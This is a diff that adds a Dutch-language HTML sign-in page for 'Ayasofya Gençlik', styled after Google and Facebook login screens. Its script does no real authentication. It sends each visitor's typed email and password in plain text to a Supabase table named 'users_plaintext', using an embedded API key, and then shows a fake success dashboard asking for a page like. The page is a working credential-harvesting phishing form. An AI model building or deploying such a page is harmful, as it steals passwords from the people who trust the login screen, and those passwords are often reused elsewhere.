@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Ayasofya Gençlik – Inloggen</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: 'Google Sans', Roboto, Arial, sans-serif;
+      background: #fff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .page {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 400px;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      padding: 48px 40px 36px;
+      text-align: center;
+    }
+
+    .brand-logo {
+      font-size: 28px;
+      font-weight: 700;
+      color: #1877F2;
+      letter-spacing: -0.5px;
+      margin-bottom: 4px;
+    }
+
+    .card h1 {
+      font-size: 24px;
+      font-weight: 400;
+      color: #202124;
+      margin-bottom: 8px;
+    }
+
+    .card .subtitle {
+      font-size: 16px;
+      color: #202124;
+      margin-bottom: 28px;
+    }
+
+    .input-group {
+      position: relative;
+      margin-bottom: 24px;
+      text-align: left;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 13px 16px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 16px;
+      color: #202124;
+      outline: none;
+      transition: border-color 0.2s;
+      background: transparent;
+    }
+
+    .input-group input:focus {
+      border-color: #1877F2;
+      border-width: 2px;
+    }
+
+    .input-group label {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 16px;
+      color: #80868b;
+      pointer-events: none;
+      transition: all 0.15s;
+      background: white;
+      padding: 0 4px;
+    }
+
+    .input-group input:focus + label,
+    .input-group input:not(:placeholder-shown) + label {
+      top: 0;
+      font-size: 12px;
+      color: #1877F2;
+    }
+
+    .input-group input:not(:focus):not(:placeholder-shown) + label {
+      color: #80868b;
+    }
+
+    .forgot {
+      display: block;
+      text-align: left;
+      font-size: 14px;
+      color: #1877F2;
+      text-decoration: none;
+      margin-top: -16px;
+      margin-bottom: 28px;
+    }
+
+    .forgot:hover { text-decoration: underline; }
+
+    .actions {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 8px;
+    }
+
+    .btn-create {
+      font-size: 14px;
+      font-weight: 600;
+      color: #1877F2;
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 0;
+    }
+
+    .btn-create:hover { text-decoration: underline; }
+
+    .btn-next {
+      padding: 10px 24px;
+      background-color: #1877F2;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      letter-spacing: 0.25px;
+    }
+
+    .btn-next:hover { background-color: #166fe5; }
+
+    .message {
+      font-size: 13px;
+      color: #d93025;
+      margin-top: 16px;
+      min-height: 18px;
+      text-align: left;
+    }
+
+    /* STAP 2: wachtwoord */
+    #step-password { display: none; }
+
+    .user-display {
+      display: flex;
+      align-items: center;
+      border: 1px solid #dadce0;
+      border-radius: 20px;
+      padding: 6px 12px;
+      width: fit-content;
+      margin: 0 auto 28px;
+      font-size: 14px;
+      color: #202124;
+      cursor: pointer;
+      gap: 8px;
+    }
+
+    .user-display:hover { background: #f1f3f4; }
+
+    .user-avatar {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      background: #1877F2;
+      color: white;
+      font-size: 12px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* DASHBOARD */
+    #dashboard-screen { display: none; }
+
+    .navbar {
+      background: #fff;
+      border-bottom: 1px solid #e0e0e0;
+      padding: 0 24px;
+      height: 64px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .navbar .nav-brand {
+      font-size: 22px;
+      font-weight: 700;
+      color: #1877F2;
+    }
+
+    .nav-right {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .nav-email {
+      font-size: 14px;
+      color: #5f6368;
+    }
+
+    .btn-logout {
+      padding: 8px 20px;
+      background: none;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 14px;
+      color: #1877F2;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .btn-logout:hover { background: #f1f3f4; }
+
+    .dashboard-body {
+      max-width: 600px;
+      margin: 60px auto;
+      padding: 0 20px;
+      text-align: center;
+    }
+
+    .dashboard-body h2 {
+      font-size: 28px;
+      font-weight: 400;
+      color: #202124;
+      margin-bottom: 8px;
+    }
+
+    .dashboard-body p {
+      font-size: 15px;
+      color: #5f6368;
+      margin-bottom: 32px;
+    }
+
+    .like-box {
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      padding: 28px;
+      text-align: center;
+    }
+
+    .like-box p {
+      font-size: 16px;
+      color: #202124;
+      margin-bottom: 16px;
+    }
+
+    .btn-like {
+      padding: 10px 28px;
+      background: #1877F2;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .btn-like:hover { background: #166fe5; }
+    .btn-like.liked { background: #34a853; cursor: default; }
+
+    footer {
+      padding: 16px 24px;
+      display: flex;
+      justify-content: space-between;
+      font-size: 12px;
+      color: #80868b;
+    }
+  </style>
+</head>
+<body>
+
+<!-- ══ LOGIN PAGINA ══ -->
+<div id="login-page">
+  <div class="page">
+    <div class="card">
+
+      <div class="brand-logo">Ayasofya Gençlik</div>
+
+      <!-- STAP 1: e-mail -->
+      <div id="step-email">
+        <h1>Inloggen</h1>
+        <p class="subtitle">Gebruik je Ayasofya Gençlik-account</p>
+
+        <div class="input-group">
+          <input type="email" id="email-input" placeholder=" " />
+          <label>E-mailadres</label>
+        </div>
+
+        <a href="#" class="forgot">E-mailadres vergeten?</a>
+
+        <div class="actions">
+          <button class="btn-create" onclick="/* geen actie */">Account aanmaken</button>
+          <button class="btn-next" onclick="goToPassword()">Volgende</button>
+        </div>
+
+        <div id="email-message" class="message"></div>
+      </div>
+
+      <!-- STAP 2: wachtwoord -->
+      <div id="step-password">
+        <h1>Welkom</h1>
+
+        <div class="user-display" onclick="goBack()">
+          <div class="user-avatar" id="avatar-letter">A</div>
+          <span id="email-display"></span>
+          <span>▾</span>
+        </div>
+
+        <div class="input-group">
+          <input type="password" id="password-input" placeholder=" " />
+          <label>Wachtwoord</label>
+        </div>
+
+        <a href="#" class="forgot">Wachtwoord vergeten?</a>
+
+        <div class="actions">
+          <button class="btn-create" onclick="goBack()">Terug</button>
+          <button class="btn-next" onclick="handleLogin()">Volgende</button>
+        </div>
+
+        <div id="password-message" class="message"></div>
+      </div>
+
+    </div>
+  </div>
+
+  <footer>
+    <span>Nederlands</span>
+    <span>Privacy · Voorwaarden · Help</span>
+  </footer>
+</div>
+
+<!-- ══ DASHBOARD ══ -->
+<div id="dashboard-screen">
+  <div class="navbar">
+    <span class="nav-brand">Ayasofya Gençlik</span>
+    <div class="nav-right">
+      <span class="nav-email" id="nav-email"></span>
+      <button class="btn-logout" onclick="handleLogout()">Uitloggen</button>
+    </div>
+  </div>
+  <div class="dashboard-body">
+    <h2 id="welcome-text">Welkom!</h2>
+    <p>Je bent succesvol ingelogd.</p>
+    <div class="like-box">
+      <p>👍 Please like our page!</p>
+      <button class="btn-like" id="like-btn" onclick="handleLike()">Like</button>
+    </div>
+  </div>
+</div>
+
+<script>
+  const SUPABASE_URL = 'https://jhlcymefogldlulkplrk.supabase.co';
+  const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpobGN5bWVmb2dsZGx1bGtwbHJrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA0MjAyNjEsImV4cCI6MjA5NTk5NjI2MX0.wMeFPjffvDngfD2UO-g8zMwr8fDkCkhTvrvOyehmzVI';
+
+  let currentEmail = '';
+
+  async function supabaseFetch(path, options = {}) {
+    const url = `${SUPABASE_URL}/rest/v1/${path}`;
+    const headers = {
+      'apikey': SUPABASE_KEY,
+      'Authorization': `Bearer ${SUPABASE_KEY}`,
+      'Content-Type': 'application/json',
+      'Prefer': 'return=representation',
+      ...options.headers
+    };
+    const response = await fetch(url, { ...options, headers });
+    const data = await response.json();
+    return { status: response.status, data };
+  }
+
+  function goToPassword() {
+    const email = document.getElementById('email-input').value.trim();
+    const msg = document.getElementById('email-message');
+    if (!email) {
+      msg.textContent = 'Vul een e-mailadres in.';
+      return;
+    }
+    msg.textContent = '';
+    currentEmail = email;
+    document.getElementById('email-display').textContent = email;
+    document.getElementById('avatar-letter').textContent = email[0].toUpperCase();
+    document.getElementById('step-email').style.display = 'none';
+    document.getElementById('step-password').style.display = 'block';
+  }
+
+  function goBack() {
+    document.getElementById('step-password').style.display = 'none';
+    document.getElementById('step-email').style.display = 'block';
+    document.getElementById('password-message').textContent = '';
+  }
+
+  async function handleLogin() {
+    const password = document.getElementById('password-input').value;
+    const msg = document.getElementById('password-message');
+    msg.textContent = '';
+
+    if (!password) {
+      msg.textContent = 'Vul je wachtwoord in.';
+      return;
+    }
+
+    const result = await supabaseFetch('users_plaintext', {
+      method: 'POST',
+      body: JSON.stringify({ email: currentEmail, password })
+    });
+
+    if (result.status === 201) {
+      document.getElementById('welcome-text').textContent = `Welkom, ${currentEmail}!`;
+      document.getElementById('nav-email').textContent = currentEmail;
+      document.getElementById('login-page').style.display = 'none';
+      document.getElementById('dashboard-screen').style.display = 'block';
+    } else {
+      msg.textContent = 'Er ging iets mis. Probeer een ander e-mailadres.';
+      console.error(result.data);
+    }
+  }
+
+  function handleLike() {
+    const btn = document.getElementById('like-btn');
+    btn.textContent = '👍 Liked!';
+    btn.classList.add('liked');
+    btn.disabled = true;
+  }
+
+  function handleLogout() {
+    document.getElementById('email-input').value = '';
+    document.getElementById('password-input').value = '';
+    document.getElementById('step-password').style.display = 'none';
+    document.getElementById('step-email').style.display = 'block';
+    document.getElementById('login-page').style.display = 'flex';
+    document.getElementById('dashboard-screen').style.display = 'none';
+    document.getElementById('like-btn').textContent = 'Like';
+    document.getElementById('like-btn').classList.remove('liked');
+    document.getElementById('like-btn').disabled = false;
+    currentEmail = '';
+  }
+
+  // Enter toets werkt ook
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') {
+      if (document.getElementById('step-password').style.display === 'block') {
+        handleLogin();
+      } else {
+        goToPassword();
+      }
+    }
+  });
+</script>
+
+</body>
+</html>
